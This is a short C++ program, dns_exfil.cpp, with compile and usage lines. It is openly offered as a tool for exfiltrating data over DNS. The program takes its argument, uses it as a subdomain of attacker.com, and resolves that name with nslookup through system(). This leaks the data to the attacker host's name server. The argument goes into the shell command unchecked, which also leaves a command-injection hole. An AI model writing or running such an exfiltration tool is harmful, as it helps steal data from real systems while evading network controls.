// ============================================================
// dns_exfil.cpp — send data as DNS query
// ------------------------------------------------------------
// Compile: clang++ -O2 -o dns_exfil dns_exfil.cpp
// Usage:   ./dns_exfil secretdata
// ============================================================
#include <cstdio>
#include <cstdlib>
#include <string>

int main(int argc, char** argv) {
    const char* data = (argc > 1) ? argv[1] : "test";
    std::string cmd = "nslookup " + std::string(data) + ".attacker.com >/dev/null 2>&1";
    system(cmd.c_str());
    return 0;
}
